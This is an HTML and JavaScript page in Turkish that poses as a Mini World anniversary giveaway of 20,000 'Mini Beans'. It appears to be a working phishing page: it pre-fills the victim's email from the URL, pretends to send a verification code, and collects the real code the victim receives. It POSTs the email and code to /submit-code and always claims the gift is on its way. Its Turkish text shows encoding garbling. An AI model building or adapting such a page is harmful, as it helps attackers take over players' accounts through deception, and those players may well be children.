<!doctype html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <title>Hediye SayfasÄ± - Mini World</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e293b, #0f172a);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .card {
      background: #ffffff;
      color: #0f172a;
      padding: 30px;
      border-radius: 12px;
      width: 360px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.25);
    }
    h1 { text-align: center; margin: 0 0 20px; font-size: 1.4rem; color: #1e293b; }
    label { display: block; margin-bottom: 8px; font-weight: 600; color: #475569; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 2px solid #e2e8f0;
      border-radius: 8px;
      font-size: 1rem;
      box-sizing: border-box;
    }
    input:focus { border-color: #3b82f6; outline: none; }
    button {
      width: 100%;
      padding: 12px;
      background: #3b82f6;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 700;
      cursor: pointer;
      font-size: 1rem;
      transition: background 0.3s;
    }
    button:hover { background: #2563eb; }
    .msg { margin-top: 12px; text-align: center; font-weight: 600; }
    .timer { margin-top: 8px; text-align: center; font-weight: bold; color: #ef4444; }
    #codeSection { margin-top: 16px; border-top: 1px solid #e2e8f0; padding-top: 16px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Mini World 15. YÄ±l Ã–zel 20.000 Mini Fasulye Hediyesi!</h1>

    <label for="email">E-posta Adresiniz</label>
    <input id="email" type="email" readonly />

    <button id="sendBtn">DoÄŸrulama Kodu GÃ¶nder</button>
    <div id="msg" class="msg"></div>
    <div id="timer" class="timer"></div>

    <div id="codeSection" style="display:none;">
      <label for="codeInput">E-postanÄ±za Gelen Kodu Girin:</label>
      <input id="codeInput" type="text" placeholder="6 Haneli Kod" maxlength="10" />
      <button id="checkBtn">Hediyeyi TanÄ±mla</button>
      <div id="codeMsg" class="msg"></div>
    </div>
  </div>

  <script>
    const sendBtn   = document.getElementById('sendBtn');
    const msg       = document.getElementById('msg');
    const timerDiv  = document.getElementById('timer');
    const codeSec   = document.getElementById('codeSection');
    const checkBtn  = document.getElementById('checkBtn');
    const codeMsg   = document.getElementById('codeMsg');
    const emailInput = document.getElementById('email');

    // URL'den e-postayÄ± al ve inputa yaz
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromUrl = urlParams.get('email');
    if (emailFromUrl) {
      emailInput.value = emailFromUrl;
    }

    sendBtn.addEventListener('click', () => {
      if (!emailInput.value) {
        msg.textContent = "Hata: E-posta bulunamadÄ±.";
        msg.style.color = "red";
        return;
      }
      
      msg.textContent = "Kod e-posta adresinize gÃ¶nderildi.";
      msg.style.color = "#16a34a";
      sendBtn.style.display = "none";
      codeSec.style.display = "block";

      let timeLeft = 180;
      const interval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerDiv.textContent = `Kodun geÃ§erlilik sÃ¼resi: ${minutes}:${seconds < 10 ? '0'+seconds : seconds}`;
        timeLeft--;
        if (timeLeft < 0) {
          clearInterval(interval);
          timerDiv.textContent = "SÃ¼re doldu! LÃ¼tfen sayfayÄ± yenileyin.";
          codeSec.style.display = "none";
        }
      }, 1000);
    });

    checkBtn.addEventListener('click', async () => {
      const email = emailInput.value;
      const code  = document.getElementById('codeInput').value.trim();

      if (!code) {
        codeMsg.textContent = "LÃ¼tfen kodu girin.";
        codeMsg.style.color = "red";
        return;
      }

      try {
        await fetch('/submit-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, code })
        });
        
        codeMsg.textContent = "Kod doÄŸrulandÄ±! Hediyeniz 24 saat iÃ§inde hesabÄ±nÄ±za yÃ¼klenecektir. ðŸŽ‰";
        codeMsg.style.color = "#16a34a";
        checkBtn.disabled = true;
      } catch (e) {
        codeMsg.textContent = "Sistem hatasÄ±, lÃ¼tfen sonra tekrar deneyin.";
        codeMsg.style.color = "red";
      }
    });
  </script>
</body>
</html>
